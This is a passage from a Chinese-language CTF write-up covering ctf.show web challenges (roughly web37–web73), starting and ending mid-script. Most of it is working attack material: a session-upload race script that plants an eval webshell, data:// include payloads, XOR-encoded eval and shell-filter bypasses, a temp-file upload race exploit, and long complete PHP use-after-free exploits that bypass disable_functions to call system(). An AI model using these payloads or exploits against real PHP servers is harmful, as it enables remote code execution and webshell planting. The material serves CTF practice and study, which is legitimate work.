&#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #恶意进度信息，readfile将直接输出文件内容 &#125; r.post(url,files=files,headers=headers,data=data)def READ(): # event.wait() while True: POST() t=r.get(&quot;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/?c=/tmp/sess_moonback&quot;) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] success&#x27;) breakfor i in range(50): threading.Thread(target=READ,args=()).start() web3812345678910111213&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgKicpOw&#x3D;&#x3D; web391234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 同样可以使用data://协议 12?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat *&#39;);?&gt;?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat *&#39;)?&gt; web4012345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 这个ban的是中文的括号。。。。php无参数函数：https://www.m00nback.xyz/2019/11/12/php-nopara-rce payload: 1?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv()))))); web4112345678910&lt;?phpif(isset($_POST[&#x27;c&#x27;]))&#123; $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123; eval(&quot;echo($c);&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; |没有过滤，构造： 12345c=&#x27; &#x27;);(&#x27;%12%05%01%04%06%09%0c%05&#x27;|&#x27;%60%60%60%60%60%60%60%60&#x27;)(&#x27;%06%0c%01%07%00%10%08%10&#x27;|&#x27;%60%60%60%60%2e%60%60%60&#x27;);//readfile(&#x27;flag.php&#x27;)c=&#x27; &#x27;);(&#x27;%12%05%01%04%06%09%0c%05&#x27;|&#x27;%60%60%60%60%60%60%60%60&#x27;)((&#x27;%06%0c%01%07&#x27;|&#x27;%60%60%60%60&#x27;).&#x27;.&#x27;.(&#x27;%10%08%10&#x27;|&#x27;%60%60%60&#x27;));// hackbar提交会有问题 在bp里吧 123c=&#x27; &#x27;);(&#x27;%60%60%60%60%60%60&#x27;|&#x27;%13%19%13%14%05%0d&#x27;)((&#x27;%03%01%14&#x27;|&#x27;%60%60%60&#x27;).&#x27; *&#x27;);//system(&#x27;cat *&#x27;) web421234567&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; #注释就行 1?c&#x3D;cat * %23 web43123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;head -n 100 * %23 web44123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;head -n 100 * %23 web45123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;head%09-n%09100%09*%09%23 web46123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;tac%09fla?.???%09%23 web47123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;tac%09fla?.???%09%23 web48123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;tac%09fla?.???%09%23 web49123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;tac%09fla?.???%09%23 web50123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23 web51123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23 web52123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag%0a%23 web5312345678910111213&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;fl&#39;&#39;ag.php%0a%23 web54123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 通配符绕过，payload: 1?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???.php%0a%23 web55123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 和红包题一样，exp: 12345678910111213141516171819import requestsimport threadingurl1=&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/?c=.+/???/????????[@-[]&#x27;url=&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/&#x27;def post(): files=&#123; &#x27;upload&#x27;:&#x27;#!/bin/sh\\necho 1433223\\ncat flag.php&#x27; &#125; r=requests.post(url,files=files)def req(): r=requests.get(url1) if &#x27;1433223&#x27; in r.text: print(r.text)for i in range(50): threading.Thread(target=post,args=()).start() threading.Thread(target=req,args=()).start() [@-[]代表是大写字母的通配符 web56123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 和web55一样 web5712345678910&lt;?php//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 自己测得下面的payload在bash里可以，在system函数不行： 123$((((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_))$[((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_] 正确的解法是： 1$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 记下大概思路： 1234$(()) &#x3D;&#x3D;&gt; 0$((~$(()))) &#x3D;&#x3D;&gt; -1$(($((~$(())))$((~$(()))))) &#x3D;&#x3D;&gt; -2$((~-37)) &#x3D;&#x3D;&gt; 36 web58-59蚁剑连 web60-66蚁剑连 插件bypass web67-70终于有个插件bypass不了的了 直接包含/flag.txt web71源码： 1234567891011121314&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 让后面的代码不执行就行 1include(&#39;&#x2F;flag.txt&#39;);die(); 或者,原理我也不清楚 12345ob_end_clean();include(&#39;&#x2F;flag.txt&#39;);include(&#39;&#x2F;flag.txt&#39;);ob_end_flush();include(&#39;&#x2F;flag.txt&#39;);ob_flush();ob_get_clean();include(&#39;&#x2F;flag.txt&#39;);include(&#39;&#x2F;flag.txt&#39;);ob_start(); 或者用阿狸师傅的脚本 1234567import requestsurl = &quot;http://03343dd8-5d78-4557-b4b6-3b7fc75528ea.chall.ctf.show/&quot;d = &#123;&#x27;c&#x27;: &#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;&#125;s = requests.post(url, d).contentfor i in s: print(chr(~i&amp;0xff), end=&#x27;&#x27;) web72123456789101112131415&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 题目有open_basedir的限制,glob://协议bypass读出flag文件名flag0.txt 1c&#x3D;$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;echo$f-&gt;getFilename().&quot;\\n&quot;;&#125;die(); 使用这个bypass disable_function发现 1str_repeat() chr() 这两个函数被ban了，替换以下就行 12str_repeat() &#x3D;&#x3D;&gt; 自己写个for循环拼接一下字符串chr() &#x3D;&#x3D;&gt; sprintf(&quot;%c&quot;,$a) exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214&lt;?phppwn(&quot;cat /flag0.txt&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;constant&#x27; constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;bin2hex&#x27; constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function my_str_repeat($a,$b)&#123; $s = &#x27;&#x27;; for($i = 0; $i &lt;= $b;$i++)&#123; $s.=$a; &#125; return $s; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(my_str_repeat(&#x27;A&#x27;, 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(my_str_repeat(&#x27;A&#x27;, 79)); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125;exit(); web73比上面多过滤了strlen()，自己定义函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225&lt;?phppwn(&quot;uname -a&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = my_strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;constant&#x27; constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;bin2hex&#x27; constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function my_str_repeat($a,$b)&#123; $s = &#x27;&#x27;; for($i = 0; $i &lt;= $b;$i++)&#123; $s.=$a; &#125; return $s; &#125; function my_strlen($a)&#123; $n = 0; for($i = 0; $i &lt;= INF;$i++)&#123; if($a[$i]!==&#x27;&#x27;)&#123; $n++; &#125;else&#123; break; &#125; &#125; return $n; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(my_str_repeat(&#x27;A&#x27;, 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(my_str_repeat(&#x27;A&#x27;, 79)); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(my_strlen($abc) == 79 || my_strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; 之前De1CTF中的exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?phppwn(&quot;/readflag&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this -&gt; a); $backtrace = (new Exception) -&gt; getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2int($str) &#123; $address = 0; $address |= ord($str[4]); $address &lt;&lt;= 8; $address |= ord($str[5]); $address &lt;&lt;= 8; $address |= ord($str[6]); $address &lt;&lt;= 8; $address |= ord($str[7]); return $address; &#125; function leak($offset) &#123; global $abc; return strrev(substr($abc, $offset, 8)); &#125; function leakA($offset) &#123; global $helper; return strrev(substr($helper -&gt; a, $offset, 8)); &#125; function write($offset, $data) &#123; global $abc; $abc[$offset] = $data[7]; $abc[$offset + 1] = $data[6]; $abc[$offset + 2] = $data[5]; $abc[$offset + 3] = $data[4]; $abc[$offset + 4] = $data[3]; $abc[$offset + 5] = $data[2]; $abc[$offset + 6] = $data[1]; $abc[$offset + 7] = $data[0]; &#125; function trigger_uaf($arg) &#123; $arg = str_repeat(&#x27;A&#x27;, 79); $vuln = new Vuln(); $vuln -&gt; a = $arg; &#125; # UAF trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper -&gt; b = function ($x) &#123; &#125;; # leak head point of next php heap $php_heap = leak(0x88); echo &quot;PHP Heap: &quot; . bin2hex($php_heap) . &quot;\\n&quot;; $abc_address = str2int($php_heap) - 0x88 - 0xa0; echo &#x27;$abc: &#x27; . dechex($abc_address) . &quot;\\n&quot;; $closure_object = leak(0x20); echo &quot;Closure Object: &quot; . bin2hex($closure_object) . &quot;\\n&quot;; # let a point to closure_object write(0x10, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($closure_object) - 0x28))); write(0x18, str_pad(&quot;\\x06&quot;, 8, &quot;\\x00&quot;, STR_PAD_LEFT)); # leak Closure Handlers $closure_handlers = leakA(0x28); echo &quot;Closure Handlers: &quot; . bin2hex($closure_handlers) . &quot;\\n&quot;; # compute system address $system_address = dechex(str2int($closure_handlers) - 10733946); echo &quot;System: &quot; . $system_address . 